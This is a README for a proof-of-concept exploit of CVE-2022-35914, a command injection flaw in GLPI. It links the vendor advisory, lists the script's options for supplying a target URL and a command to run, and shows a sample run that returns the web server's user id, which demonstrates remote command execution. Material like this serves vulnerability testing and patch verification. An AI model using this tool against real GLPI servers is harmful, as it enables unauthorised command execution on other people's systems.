# CVE-2022-35914 PoC

## References

- https://github.com/glpi-project/glpi/security/advisories/GHSA-c5gx-789q-5pcr

## Usage

```bash
pip install -r requirements.txt
```

```bash
./CVE-2022-35914.py -h
usage: CVE-2022-35914.py [-h] -u URL -c CMD [-f HOOK] [--check] [--user-agent USER_AGENT]

CVE-2022-35914 - GLPI - Command injection using a third-party library script

options:
  -h, --help            show this help message and exit
  -u URL                URL to test
  -c CMD                Command to launch
  -f HOOK               PHP hook function (default: exec)
  --check               Just check, no command execution.
  --user-agent USER_AGENT
                        Custom User-Agent
```

Example:

```bash
❯ ./CVE-2022-35914.py -u http://glpi
[+] Command output (Return code: 0):
 uid=48(apache) gid=48(apache) groups=48(apache)
```
